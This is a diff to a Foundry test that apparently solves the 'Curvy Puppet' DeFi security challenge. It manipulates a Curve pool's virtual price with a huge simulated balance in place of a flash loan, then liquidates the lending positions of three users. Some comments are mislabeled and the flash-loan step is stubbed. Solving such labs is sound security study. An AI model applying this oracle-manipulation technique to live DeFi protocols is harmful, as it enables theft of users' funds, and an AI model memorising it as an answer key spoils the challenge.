@@ -159,8 +159,59 @@ contract CurvyPuppetChallenge is Test {
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
         
+        // 1. Get lpTokens from treasury
+        uint256 lpBalance = IERC20(curvePool.lp_token()).balanceOf(treasury);
+        IERC20(curvePool.lp_token()).transferFrom(treasury, player, lpBalance);
+        
+        // Todo: Implementing a flashloan contract
+        // Borrowing a large amount from a FlashLoan for swap
+        vm.deal(player, 2000000000 ether);
+
+        // 2. Perform large swaps in Curve pool to manipulate virtual price
+        uint256[2] memory amounts;
+        amounts[0] = player.balance; // Use all our ETH
+        curvePool.exchange{value: amounts[0]}(0, 1, amounts[0], 0);
+
+  
+        // Allow lending contract to pull LP tokens via Permit2
+        IERC20(curvePool.lp_token()).approve(address(permit2), type(uint256).max);
+        permit2.approve(
+            address(curvePool.lp_token()),
+            address(lending),
+            uint160(type(uint256).max),
+            uint48(block.timestamp + 2)
+        );
+        
+        // 5. Liquidate all positions
+        address[3] memory users = [alice, bob, charlie];
+        for (uint256 i = 0; i < users.length; i++) {
+            lending.liquidate(users[i]);
+        }
+        
+        // 6. Send rescued DVT to treasury
+        dvt.transfer(treasury, dvt.balanceOf(player));
+
+        // 7. Send remaing lpTokens back to treasury
+        uint256 playerLpBalance = IERC20(curvePool.lp_token()).balanceOf(player);
+        IERC20(curvePool.lp_token()).transfer(treasury, playerLpBalance);
+        
+                
+        // 8. Convert remaining ETH back to WETH and send to treasury
+        amounts[1] = stETH.balanceOf(player); // Use all our ETH
+
+        stETH.approve(address(curvePool), type(uint256).max);
+        curvePool.exchange(1, 0, amounts[1] + 1, 0);
+        
+        // Paying back flashloan 
+        address flashloan = makeAddr("flashloan");
+        flashloan.call{value: player.balance}("");
+        
+
+        
+
     }
 
+   
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
@@ -184,3 +235,5 @@ contract CurvyPuppetChallenge is Test {
         assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
     }
 }
+
+
